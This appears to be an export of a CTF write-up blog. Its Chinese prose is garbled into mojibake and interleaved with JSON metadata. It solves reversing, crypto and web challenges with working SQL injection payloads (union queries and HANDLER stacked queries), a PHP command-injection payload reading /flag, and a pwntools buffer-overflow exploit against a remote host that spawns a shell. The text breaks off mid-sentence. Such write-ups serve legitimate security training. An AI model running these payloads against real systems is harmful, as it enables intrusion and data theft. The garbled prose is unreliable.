å¯ä»¥çœ‹åˆ°æ˜¯å¯¹å›¾åƒæ–‡ä»¶çš„æ¯ä¸€ä¸ªå­—èŠ‚éƒ½è¿›è¡Œäº†å¼‚æˆ–è¿ç®—ï¼Œä½†æ˜¯å¼‚æˆ–çš„å¯¹è±¡æ˜¯ä¸ç¡®å®šçš„åœ¨äº¤å‰å¼•ç”¨åˆ°æœ€åŸå§‹çš„å˜é‡ä»¥åŠåŠ¨æ€è°ƒè¯•ä¹‹åå¾—å‡ºç»“è®ºï¼šä½¿ç”¨çš„æ˜¯è¾“å…¥çš„ä¸‰ä½æ•°å­—çš„md5å€¼ä½œä¸ºkeyï¼Œå¯¹å›¾åƒæ–‡ä»¶è¿›è¡Œå¾ªç¯å¼‚æˆ–çš„ 1234567891011121314151617181920212223242526272829303132Stack[00001C64]:0000003589DCF5A8 db 32h ; 2Stack[00001C64]:0000003589DCF5A9 db 30h ; 0Stack[00001C64]:0000003589DCF5AA db 32h ; 2Stack[00001C64]:0000003589DCF5AB db 63h ; cStack[00001C64]:0000003589DCF5AC db 62h ; bStack[00001C64]:0000003589DCF5AD db 39h ; 9Stack[00001C64]:0000003589DCF5AE db 36h ; 6Stack[00001C64]:0000003589DCF5AF db 32h ; 2Stack[00001C64]:0000003589DCF5B0 db 61h ; aStack[00001C64]:0000003589DCF5B1 db 63h ; cStack[00001C64]:0000003589DCF5B2 db 35h ; 5Stack[00001C64]:0000003589DCF5B3 db 39h ; 9Stack[00001C64]:0000003589DCF5B4 db 30h ; 0Stack[00001C64]:0000003589DCF5B5 db 37h ; 7Stack[00001C64]:0000003589DCF5B6 db 35h ; 5Stack[00001C64]:0000003589DCF5B7 db 62h ; bStack[00001C64]:0000003589DCF5B8 db 39h ; 9Stack[00001C64]:0000003589DCF5B9 db 36h ; 6Stack[00001C64]:0000003589DCF5BA db 34h ; 4Stack[00001C64]:0000003589DCF5BB db 62h ; bStack[00001C64]:0000003589DCF5BC db 30h ; 0Stack[00001C64]:0000003589DCF5BD db 37h ; 7Stack[00001C64]:0000003589DCF5BE db 31h ; 1Stack[00001C64]:0000003589DCF5BF db 35h ; 5Stack[00001C64]:0000003589DCF5C0 db 32h ; 2Stack[00001C64]:0000003589DCF5C1 db 64h ; dStack[00001C64]:0000003589DCF5C2 db 32h ; 2Stack[00001C64]:0000003589DCF5C3 db 33h ; 3Stack[00001C64]:0000003589DCF5C4 db 34h ; 4Stack[00001C64]:0000003589DCF5C5 db 62h ; bStack[00001C64]:0000003589DCF5C6 db 37h ; 7Stack[00001C64]:0000003589DCF5C7 db 30h ; 0 è¿™æ®µæ•°æ®å°±æ˜¯è¾“å…¥çš„æµ‹è¯•æ•°æ®123å¯¹åº”çš„md5å€¼ï¼Œè€Œä¸ºäº†è§£å¯†å›¾åƒï¼Œè¾“å…¥çš„keyéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ 12è¯·è¾“å…¥ä½ çš„keyï¼š 123MD5 çš„å‰ä¸‰ä½æ•°å­—ä¸ keyçš„æœ¬èº«å€¼ ä¸ç›¸ç­‰ã€‚æ³¨:æ•°å­—èŒƒå›´ä¸º0--9 è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸»è¦æ˜¯æ•°å­—èŒƒå›´ä¸º0--9æŒ‡çš„æ˜¯è¾“å…¥çš„keyè¿˜æ˜¯md5çš„å€¼ï¼Œè¿˜æ˜¯ä¸¤è€…çš†æ˜¯ç­”æ¡ˆæ˜¯åªæœ‰è¾“å…¥çš„keyï¼Œå› ä¸ºä½œä¸ºå¾ªç¯å¼‚æˆ–çš„å¯¹è±¡é•¿åº¦åº”è¯¥æ˜¯ä¸€å®šçš„ï¼Œè€Œå¦‚æœè½¬æ¢ä¸ºåè¿›åˆ¶çš„è¯åŸæœ¬çš„md5ç¼–ç çš„é•¿åº¦å¯èƒ½ä¼šå˜åŒ–ï¼Œè¿™ä¸€ç‚¹ä¹Ÿå¯ä»¥åœ¨å…ˆå‰å¯¹å›¾åƒåŠ å¯†çš„ä»£ç ä¸­å¾—å‡º 1*((_BYTE *)Buffer + i) ^= strtol((const char *)(i % 32 + a2), 0i64, 16); å¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯ä»¥32ä¸ºå‘¨æœŸçš„ æ‰€ä»¥ç°åœ¨çš„é—®é¢˜å°±æ˜¯æ‰¾åˆ°æŸä¸‰ä½æ•°å­—ï¼Œå…¶md5çš„å€¼çš„å‰ä¸‰ä½ä¸åŸæœ¬çš„å€¼æ˜¯ç›¸ç­‰çš„ ç”Ÿæˆæ­£ç¡®çš„key 1234567891011import hashlibm = hashlib.md5()for i in range(0,10): for j in range(0, 10): for k in range(0, 10): num = f&quot;&#123;i*100+j*10+k:03d&#125;&quot; c = hashlib.md5(num.encode(&#x27;utf8&#x27;)).hexdigest() print(num, str(c)[0:3]) if str(num) == str(c)[0:3]: print(num) è¿™é‡Œæœ‰ä¸ªå‘ï¼Œä½¿ç”¨pythonå®ç°md5ç¼–ç è¿˜æœ‰ä¸€ç§å…ˆupdateå†hexdigestçš„æ–¹æ³•ï¼Œé‚£ç§æ–¹æ³•åœ¨è¿™é‡Œæ˜¯è¡Œä¸é€šçš„320ç„¶åå°†keyä½œä¸ºè¾“å…¥å°±å¯ä»¥å¾—åˆ°è§£å¯†åçš„å›¾ç‰‡äº† flag&#123;pic_pic_is_so_easy!&#125; Ro1ling~é¢˜ç›®æè¿° flag is rolling ~ flag is flying ~ press q to quit tips: The flag format is XSCTF\\&#123;[ -~]+\\&#125; è¿è¡Œç¨‹åºï¼Œä¼šå‡ºç°å¼¹å¹•ä¸€æ ·é£˜è¿‡çš„æ–‡å­—ä½†æ˜¯ï¼Œåœ¨ä¸­æ­¢è¿è¡Œæ—¶å‡ºç°äº†è¿™æ ·çš„æŠ¥é”™ 123456Traceback (most recent call last): File &quot;Ro1ling.py&quot;, line 97, in &lt;module&gt; File &quot;curses\\__init__.py&quot;, line 94, in wrapper File &quot;Ro1ling.py&quot;, line 94, in mainKeyboardInterrupt[21964] Failed to execute script &#x27;Ro1ling&#x27; due to unhandled exception! ç†Ÿæ‚‰çš„Tracebackï¼Œä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥æ˜¯python æ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨pythonç¼–å†™å¹¶æ‰“åŒ…çš„exeæ–‡ä»¶èƒ½æ‰“åŒ…pythonçš„å·¥å…·ä¸»è¦æœ‰pyinstallerç­‰ï¼Œè¿™é‡Œä½¿ç”¨å¯¹åº”çš„pyinstxtractoråç¼–è¯‘ 1python pyinstxtractor.py Ro1ling.exe è¿è¡Œä»¥ä¸Šå‘½ä»¤ä¹‹åå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­æœ‰åŒåçš„pycæ–‡ä»¶ä½¿ç”¨uncompyle6å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpyæ–‡ä»¶ä½†æ˜¯æŠ¥é”™äº†ä½¿ç”¨åœ¨çº¿ç½‘ç«™çš„ç»“æœä¹Ÿæ˜¯ä¸å®Œæ•´çš„ ä¸Šç½‘æŸ¥è¯¢ä¹‹åæ‰¾åˆ°è¿™ä¹ˆä¸€ç¯‡åšå®¢pythoné€†å‘å®æˆ˜ï¼šåç¼–è¯‘python3 pycæ–‡ä»¶ - ä¹˜èˆŸå‡‰ - åšå®¢å›­ (cnblogs.com) é‡Œè¾¹æœ‰æ‰‹åŠ¨æå–opcodeçš„ç¤ºä¾‹ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import codefrom uncompyle6.main import decompileimport sys# version = (3, 8, 0)import disdef get_sub_codeObject_list(co): return [ins for ins in list(dis.Bytecode(co)) if &quot;code object&quot; in str(ins.argval)]outstream = sys.stdoutshowasm = Noneshowast = Falseshowgrammar = Falsesource_encoding = Nonemapstream = Nonedo_fragments = Falsefrom xdis import load_modulefilename = &quot;Ro1ling.pyc&quot;code_objects = &#123;&#125;(version, timestamp, magic_int, co, is_pypy, source_size, sip_hash) = load_module( filename, code_objects)def decompile_part(co,father_name=None,outstream=sys.stdout): try: if father_name is not None: name = &quot;%s.%s&quot; % (father_name,co.co_name) else: name = co.co_name outstream.write(&quot;\\n# %s ____________________________________________\\n&quot; % name) decompile( version, co, outstream, None, False, timestamp, False, None, code_objects=&#123;&#125;, source_size=source_size, is_pypy=False, magic_int=magic_int, mapstream=None, do_fragments=False, ) except: bytecode = get_sub_codeObject_list(co) for code in bytecode: co = code.argval decompile_part(co,name,outstream)decompile_part(co) 1234567891011121314import disimport marshalimport sysimport iosys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;) #æ”¹å˜æ ‡å‡†è¾“å‡ºçš„é»˜è®¤ç¼–ç if len(sys.argv) == 2: filename = sys.argv[1] with open(filename,&quot;rb&quot;) as fp: byteCode = fp.read()[16:] co = marshal.loads(byteCode) dis.dis(co) å…ˆè¿è¡Œç¬¬ä¸€ä»½ä»£ç ï¼Œå†è¿è¡Œç¬¬äºŒä»½ä»£ç ï¼Œå°±å¯ä»¥å¾—åˆ°opcodeçš„è¾“å‡º 1234567891011121314 28 72 BUILD_LIST 0 74 LOAD_CONST 6 ((&#x27;Summer in the hills&#x27;, &#x27;Those hazy days I do remember&#x27;, &#x27;We were running still&#x27;, &#x27;Had the whole world at our feet&#x27;, &#x27;Watching seasons change&#x27;, &#x27;Our roads were lined with adventure&#x27;, &#x27;Mountains in the way&#x27;, &quot;Couldn&#x27;t keep us from the sea&quot;, &#x27;Here we stand open arms&#x27;, &#x27;This is home where we are&#x27;, &#x27;Ever strong in the world that we made&#x27;, &#x27;I still hear you in the breeze&#x27;, &#x27;See your shadows in the trees&#x27;, &#x27;Holding on, memories never change&#x27;)) 76 CALL_FINALLY 1 (to 79) 78 STORE_DEREF 2 (phrases) 29 80 LOAD_CONST 7 (&#x27;ğ™“ğ™ğ˜¾ğ™ğ™&#123;ğ™0ğ™§_0ğ™£ğ™˜3_ğ™®0ğ™ª_ğ™4ğ™«3_7ğ™–57ğ™šğ™™_ğ™›ğ™¡ğ™ğ™œ ğ™ğ™©_ğ™®0ğ™ª_ğ™¬1ğ™¡ğ™¡_ï¿½44ğ™¡ğ™ _7ğ™3_3ğ™–ğ™§7ğ™_ğ™¬17ğ™_ğ™®0ğ™ªğ™§_3ğ™®35_7ğ™ªğ™§ğ™£3ğ™™_5ğ™ ğ™®ğ™¬4ğ™§ğ™™5&#125;&#x27;) 82 STORE_DEREF 3 (secret_message) 46 84 LOAD_DEREF 4 (stdscr) &gt;&gt; 86 LOAD_METHOD 7 (nodelay) 88 LOAD_CONST 8 (True) 90 CALL_METHOD 1 92 POP_TOP å…¶ä¸­å› ä¸ºå‘½ä»¤è¡Œçš„ç¼–ç åŸå› è¿™é‡Œçš„flagå…¶å®æ˜¯ä¹±ç ï¼ˆå› æ­¤æˆ‘è¿˜åˆ†æäº†ä¸€ä¸‹opcodeæœ‰æ²¡æœ‰åŠ å¯†çš„è¿‡ç¨‹ï¼Œäº‹å®è¯æ˜æ²¡æœ‰ï¼‰ä½†æ˜¯opcodeè½¬æ¢ä¸ºpyä»£ç çš„æ–¹å¼æ²¡æœ‰æ‰¾åˆ° åœ¨å¤åˆ¶åˆ°å…¶ä»–æ–‡æœ¬ç¼–è¾‘å™¨ä¹‹åå°±å¯ä»¥çœ‹åˆ°flagäº†ï¼ˆè¦æ‰‹æ‰“ï¼Œå› ä¸ºæ ¼å¼å†™äº†åªæ”¯æŒasciiç¼–ç çš„å­—ç¬¦ï¼Œè¿™é‡Œæ˜¯unicodeï¼‰ XSCTF&#123;F0r_0nc3_y0u_h4v3_7a57ed_flight_y0u_w1ll_w4lk_7h3_3ar7h_w17h_y0ur_3y35_7urn3d_5kyw4rd5&#125;è¿™flagçœŸé•¿å•Š Running~ä¸€ä¸ªæ²¡æœ‰åç¼€çš„æ–‡ä»¶ï¼Œå†…å®¹æ˜¯jsä»£ç  1var _0x21b6c9=_0xe50d;function _0xe50d(_0x483c4e,_0x3bb3e1)&#123;var _0x1173b4=_0x1173();return _0xe50d=function(_0xe50d90,_0x1a4c11)&#123;_0xe50d90=_0xe50d90-0x105;var _0x33ff31=_0x1173b4[_0xe50d90];return _0x33ff31;&#125;,_0xe50d(_0x483c4e,_0x3bb3e1);&#125;function _0x1173()&#123;var _0x2badaa=[&#x27;920aGutvi&#x27;,&#x27;517wlRFdu&#x27;,&#x27;221112hjXCvb&#x27;,&#x27;169436bqkkfr&#x27;,&#x27;8dhAXCJ&#x27;,&#x27;12838203EfwKcG&#x27;,&#x27;log&#x27;,&#x27;CgogX18gICBfXyAgIF9fX19fICAgIF9fX19fICAgX19fX19fXyAgIF9fX19fXyAgICAgX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgXyAgIF8gICAgIF8gICAgICAgICAgIF8gICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgIF8gIF8gICAgIF8gICAgIF8gICAgX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgX19fXyAgICBfICAgICAgICBfXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgXyAgICAgICAgICAgICAgICAgIF9fICAgCiBcIFwgLyAvICAvIF9fX198ICAvIF9fX198IHxfXyAgIF9ffCB8ICBfX19ffCAgIC8gLyAgICAgL1wgICAgICAgICAgICAgICAgICAgICAgfF8gICBffCAgICAgICAgIChfKSB8IHwgICAoXykgICAgICAgICB8IHwgICAgICAgICAgfCAgX19fX3wgICAgICAgICAgICAgICAgL18gfCAgICAgICAgICAgICAgICB8IHx8IHwgICB8IHwgICAoXykgIC8gXyBcICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gX3wgICAgICAgICAgIC8gX18gXCAgfCB8ICAgICAgLyBffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgfCAgIChfKSAgICAgICAgICAgICAgICAgXCBcICAKICBcIFYgLyAgfCAoX19fICAgfCB8ICAgICAgICAgfCB8ICAgIHwgfF9fICAgICB8IHwgICAgIC8gIFwgICAgIF8gX18gICAgICAgICAgICAgIHwgfCAgICBfIF9fICAgIF8gIHwgfF8gICBfICAgIF9fIF8gIHwgfCAgICAgICAgICB8IHxfXyAgICBfXyAgX18gIF8gX18gICAgfCB8ICAgX19fICAgIF8gX18gIHwgfHwgfF8gIHwgfF8gICBfICB8IHwgfCB8ICBfIF9fICAgICAgICAgICAgICBfX18gICB8IHxfICAgICAgICAgICB8IHwgIHwgfCB8IHxfXyAgIHwgfF8gICBfICAgXyAgIF9fXyAgICBfX18gICAgX18gXyAgfCB8XyAgIF8gICAgX19fICAgIF8gX18gICAgfCB8IAogICA+IDwgICAgXF9fXyBcICB8IHwgICAgICAgICB8IHwgICAgfCAgX198ICAgLyAvICAgICAvIC9cIFwgICB8ICdfIFwgICAgICAgICAgICAgfCB8ICAgfCAnXyBcICB8IHwgfCBfX3wgfCB8ICAvIF9gIHwgfCB8ICAgICAgICAgIHwgIF9ffCAgIFwgXC8gLyB8ICdfIFwgICB8IHwgIC8gXyBcICB8ICdfX3wgfF9fICAgX3wgfCBfX3wgfCB8IHwgfCB8IHwgfCAnXyBcICAgICAgICAgICAgLyBfIFwgIHwgIF98ICAgICAgICAgIHwgfCAgfCB8IHwgJ18gXCAgfCAgX3wgfCB8IHwgfCAvIF9ffCAgLyBfX3wgIC8gX2AgfCB8IF9ffCB8IHwgIC8gXyBcICB8ICdfIFwgICAgXCBcCiAgLyAuIFwgICBfX19fKSB8IHwgfF9fX18gICAgIHwgfCAgICB8IHwgICAgICBcIFwgICAgLyBfX19fIFwgIHwgfCB8IHwgICAgICAgICAgIF98IHxfICB8IHwgfCB8IHwgfCB8IHxfICB8IHwgfCAoX3wgfCB8IHwgICAgICAgICAgfCB8X19fXyAgID4gIDwgIHwgfF8pIHwgIHwgfCB8IChfKSB8IHwgfCAgICAgICB8IHwgICB8IHxfICB8IHwgfCB8X3wgfCB8IHwgfCB8ICAgICAgICAgIHwgKF8pIHwgfCB8ICAgICAgICAgICAgfCB8X198IHwgfCB8XykgfCB8IHwgICB8IHxffCB8IFxfXyBcIHwgKF9fICB8IChffCB8IHwgfF8gIHwgfCB8IChfKSB8IHwgfCB8IHwgICAvIC8KIC9fLyBcX1wgfF9fX19fLyAgIFxfX19fX3wgICAgfF98ICAgIHxffCAgICAgICB8IHwgIC9fLyAgICBcX1wgfF98IHxffCAgICAgICAgICB8X19fX198IHxffCB8X3wgfF98ICBcX198IHxffCAgXF9fLF98IHxffCAgICAgICAgICB8X19fX19ffCAvXy9cX1wgfCAuX18vICAgfF98ICBcX19fLyAgfF98ICAgICAgIHxffCAgICBcX198IHxffCAgXF9fXy8gIHxffCB8X3wgICAgICAgICAgIFxfX18vICB8X3wgICAgICAgICAgICAgXF9fX18vICB8Xy5fXy8gIHxffCAgICBcX18sX3wgfF9fXy8gIFxfX198ICBcX18sX3wgIFxfX3wgfF98ICBcX19fLyAgfF98IHxffCAgfCB8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcX1wgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICB8IHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgIHxffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX19fX198ICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCg==&#x27;,&#x27;3076824IERKkW&#x27;,&#x27;6626otVnDv&#x27;,&#x27;4488330eyQBas&#x27;,&#x27;7196435AHLNnm&#x27;];_0x1173=function()&#123;return _0x2badaa;&#125;;return _0x1173();&#125;(function(_0x3fa77a,_0x506be4)&#123;var _0x324ad3=_0xe50d,_0x1b9807=_0x3fa77a();while(!![])&#123;try&#123;var _0x5cf5b7=-parseInt(_0x324ad3(0x107))/0x1*(-parseInt(_0x324ad3(0x10f))/0x2)+-parseInt(_0x324ad3(0x10e))/0x3+parseInt(_0x324ad3(0x109))/0x4+parseInt(_0x324ad3(0x105))/0x5+-parseInt(_0x324ad3(0x110))/0x6+parseInt(_0x324ad3(0x10b))/0x7*(parseInt(_0x324ad3(0x10a))/0x8)+-parseInt(_0x324ad3(0x108))/0x9*(parseInt(_0x324ad3(0x106))/0xa);if(_0x5cf5b7===_0x506be4)break;else _0x1b9807[&#x27;push&#x27;](_0x1b9807[&#x27;shift&#x27;]());&#125;catch(_0x29c073)&#123;_0x1b9807[&#x27;push&#x27;](_0x1b9807[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x1173,0xf2d11),console[_0x21b6c9(0x10c)](atob(_0x21b6c9(0x10d)))); ç›´æ¥å¤åˆ¶åˆ°æµè§ˆå™¨æ§åˆ¶å° 123456789__ __ _____ _____ _______ ______ __ _____ _ _ _ _ ______ __ _ _ _ _ ___ __ ____ _ __ _ _ __ \\ \\ &#x2F; &#x2F; &#x2F; ____| &#x2F; ____| |__ __| | ____| &#x2F; &#x2F; &#x2F;\\ |_ _| (_) | | (_) | | | ____| &#x2F;_ | | || | | | (_) &#x2F; _ \\ &#x2F; _| &#x2F; __ \\ | | &#x2F; _| | | (_) \\ \\ \\ V &#x2F; | (___ | | | | | |__ | | &#x2F; \\ _ __ | | _ __ _ | |_ _ __ _ | | | |__ __ __ _ __ | | ___ _ __ | || |_ | |_ _ | | | | _ __ ___ | |_ | | | | | |__ | |_ _ _ ___ ___ __ _ | |_ _ ___ _ __ | | &gt; &lt; \\___ \\ | | | | | __| &#x2F; &#x2F; &#x2F; &#x2F;\\ \\ | &#39;_ \\ | | | &#39;_ \\ | | | __| | | &#x2F; _&#96; | | | | __| \\ \\&#x2F; &#x2F; | &#39;_ \\ | | &#x2F; _ \\ | &#39;__| |__ _| | __| | | | | | | | &#39;_ \\ &#x2F; _ \\ | _| | | | | | &#39;_ \\ | _| | | | | &#x2F; __| &#x2F; __| &#x2F; _&#96; | | __| | | &#x2F; _ \\ | &#39;_ \\ \\ \\ &#x2F; . \\ ____) | | |____ | | | | \\ \\ &#x2F; ____ \\ | | | | _| |_ | | | | | | | |_ | | | (_| | | | | |____ &gt; &lt; | |_) | | | | (_) | | | | | | |_ | | | |_| | | | | | | (_) | | | | |__| | | |_) | | | | |_| | \\__ \\ | (__ | (_| | | |_ | | | (_) | | | | | &#x2F; &#x2F;&#x2F;_&#x2F; \\_\\ |_____&#x2F; \\_____| |_| |_| | | &#x2F;_&#x2F; \\_\\ |_| |_| |_____| |_| |_| |_| \\__| |_| \\__,_| |_| |______| &#x2F;_&#x2F;\\_\\ | .__&#x2F; |_| \\___&#x2F; |_| |_| \\__| |_| \\___&#x2F; |_| |_| \\___&#x2F; |_| \\____&#x2F; |_.__&#x2F; |_| \\__,_| |___&#x2F; \\___| \\__,_| \\__| |_| \\___&#x2F; |_| |_| | | \\_\\ ______ ______ | | ______ ______ &#x2F;_&#x2F; |______| |______| |_| |______| |______| æ‹‰ä¼¸ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°flagï¼ˆæ¢æˆä¸ä¼šè‡ªåŠ¨æ¢è¡Œçš„æ–‡æœ¬ç¼–è¾‘è½¯ä»¶ï¼Œå¦‚notepad++ï¼‰ XSCTF&#123;An_Initial_Exp1or4ti0n_of_Obfuscation&#125; saveSaofe1a_partAè€ƒsqlæ³¨å…¥æµ‹è¯•ä¸€ä¸‹å‘ç°æ˜¯å­—ç¬¦å‹æŸ¥è¯¢ï¼Œå¹¶ä¸”å­˜åœ¨è”åˆæ³¨å…¥ é¦–å…ˆæŸ¥è¯¢å½“å‰æ•°æ®åº“ ç„¶åæŸ¥è¯¢è¯¥æ•°æ®åº“ä¸‹çš„è¡¨ ç„¶åæŸ¥è¯¢è¡¨ä¸‹çš„å­—æ®µ æ ¹æ®é¢˜ç›®æç¤ºï¼Œé€ä¸ªç¿»è¡¨ 123456-1&#x27; union select database(),2,3,4#-1&#x27; union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=&#x27;student&#x27;#-1&#x27; union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=&#x27;class1&#x27;#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class1#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class2#-1&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class3# XSCTF&#123;Saofe1a_r3a11y_l0ve_xiaomei&#125; saveSaofe1a_partBåŒæ ·æ˜¯sqlæ³¨å…¥ç»è¿‡æµ‹è¯•ï¼šè®©æˆ‘æƒ³æƒ³é™¤äº†insertã€whereã€deleteã€selectã€dropã€updateå’Œ.ä½ ä»¬å¤§é»‘é˜”è¿˜æœ‰ä»€ä¹ˆæ‹›å˜»å˜»ï¼Œæƒ³èµ·æ¥äº†ï¼Œsetã€prepareã€executeä¹Ÿä¸è¡Œå“¦ ç”¨handlerå¯ä»¥æŸ¥ 1-1&#x27;;handler `2333` open;handler `2333` read first;handler `2333` close;# å¦‚æœä¸åœ¨ç¬¬ä¸€æ¡ï¼Œä½†æ˜¯é¢˜ç›®åˆè¿‡æ»¤äº†whereå…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨limit 1-1&#x27;;handler `class3` open;handler `class3` read first limit 30,1;handler `class3` close;# XSCTF&#123;Saofe1a_wAnt_a_9ir1fri3nd&#125; ç‡•å­ä¸è¦èµ°~12345678910//ç‡•å­ï¼Œç‡•å­ï¼Œæ²¡æœ‰ä½ æˆ‘æ€ä¹ˆæ´»å•Šï¼Œä¸è¦ç”©å¼€æˆ‘å•Š function hello_shell($cmd)&#123; system($cmd.&quot;&gt;/dev/null 2&gt;&amp;1&quot;); &#125; isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null; highlight_file(__FILE__); ?&gt; ç›´æ¥ç”¨åˆ†å·éš”å¼€å³å¯?cmd=cat /flag; XSCTF&#123;Yanz1_i_w1sh_y0u_hApp1neSs&#125; gift_RSA123456789101112131415161718from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)p = getStrongPrime(512)q = getStrongPrime(512)n = p*qe = 0x10001phi = (p-1)*(q-1)d = inverse(e, phi)gift = pow(m, d, n)print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;gift = &#123;gift&#125;&#x27;)&quot;&quot;&quot;n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117gift = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308&quot;&quot;&quot; æ ¹æ®å…¬é’¥åŠ å¯†ç®—æ³•çš„ç‰¹æ€§ï¼Œå…¬ç§é’¥äº’æ¢æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œç”¨ç§é’¥åŠ å¯†ï¼ˆç­¾åï¼‰ï¼Œå°±å¯ä»¥ä½¿ç”¨å…¬é’¥è§£å¯†ï¼ˆéªŒè¯ï¼‰ exp 1234567from Crypto.Util.number import *e = 0x10001c = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117print(long_to_bytes(pow(c, e, n))) XSCTF&#123;H3re_i5_@_Gif7_f0r_y0u_From_Euler:)))))!&#125; ä½ è¯´ä½ æ˜¯å‡¯æ’’å¤§å¸å°Šå˜Ÿå‡å˜Ÿå•Š1Ã–v0 0vo O.0 O_Ã– Ã–vo 0vo ov0 ovÃ– o.Ã– owÃ– 0.o OwÃ– o.O Ã–.O O_0 o_Ã– Ã–_0 OwÃ– Ov0 0wÃ– Ã–.Ã– owO 0v0 o.O o.Ã– Ã–.0 o.0 ovO o.Ã– Ã–.o 0vo Ow0 Ã–.Ã– owo 0_0 0.0 o.Ã– Ã–.O O.0 O_0 o_O 0vÃ– owo å°Šå˜Ÿå‡å˜ŸO.o (zdjd.vercel.app) è§£å¯†ä¹‹åå‡¯æ’’çˆ†ç ´ XSCTF&#123;gr3at_y0u_aRe_reA1_CaesAr&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"XSCTF_warmup","slug":"xsctf_warmup","date":"2024-11-04T15:29:52.430Z","updated":"2024-11-09T19:28:26.494Z","comments":true,"path":"2024/11/04/xsctf_warmup/","link":"","permalink":"http://uniqueland.top/2024/11/04/xsctf_warmup/","excerpt":"","text":"babystacké™„ä»¶ï¼šbabystack 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int16 v4; // [rsp+Eh] [rbp-2h] init_func(argc, argv, envp); start_show(); puts(&amp;s); __isoc99_scanf(v4); vuln(v4); return 0;&#125;ssize_t __fastcall vuln(unsigned int a1)&#123; char buf[80]; // [rsp+10h] [rbp-50h] BYREF if ( a1 &lt;= 0x7FFFFFFE ) &#123; printf(format); exit(0); &#125; puts(&amp;byte_402038); puts(&amp;byte_40205D); return read(0, buf, 0x8848uLL);&#125;int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125; å¯¹äºç¬¬ä¸€ä¸ªæ¯”è¾ƒï¼Œç›´æ¥è¾“å…¥-1 å¯¹äºreadå‡½æ•°ï¼Œè¾“å…¥80+8ä¸ªå­—ç¬¦ä¹‹åå†è¾“å…¥éœ€è¦è¿”å›çš„åœ°å€ï¼ˆbackdoorï¼‰å³å¯ exp 12345678910111213from pwn import *r = remote(&#x27;43.248.97.213&#x27;, 40054)elf = ELF(&#x27;./babystack&#x27;)sysaddr = elf.symbols[&#x27;backdoor&#x27;]print(&#x27;0x%x&#x27;%sysaddr)r.recv()r.sendline(b&#x27;-1&#x27;)r.recv()r.sendline(b&#x27;a&#x27;*80 + b&#x27;b&#x27;*8 + p64(sysaddr))r.interactive() æ­£å¸¸æ¥è¯´è¿™ä¹ˆå†™æ²¡é—®é¢˜ï¼Œä½†æ˜¯è¿è¡Œçš„æ—¶å€™ä¸ä¼šè¿”å›shellåŸå› ä¼°è®¡æ˜¯å †æ 